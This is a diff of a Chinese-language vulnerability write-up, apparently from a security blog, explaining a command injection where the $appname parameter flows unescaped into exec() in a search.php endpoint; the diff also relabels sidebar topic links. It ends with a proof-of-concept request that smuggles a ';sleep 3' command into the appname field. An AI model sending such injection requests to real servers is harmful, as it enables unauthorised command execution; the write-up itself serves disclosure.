@@ -51,11 +51,11 @@ return;
 
 深入探索
 
-网站托管与域名注册
+黑客与破解
 
-计算机科学
+计算机安全
 
-书籍
+编程
 
 当 `$action = 'addtask'` 时，用户可控参数 `$appname` （变量覆盖）直接用于构建命令行字符串 `$cmd`，并通过 `exec($cmd)` 执行。该参数未经过充分过滤或转义，造成[命令注入](https://mrxn.net/tag/rce)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
@@ -103,7 +103,7 @@ else if($action == 'showtask'){
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-计算机安全
+网络安全
 
 ```
 GET /data/search/search.php?action=addtask&appname=search;sleep+3+%23 HTTP/1.1
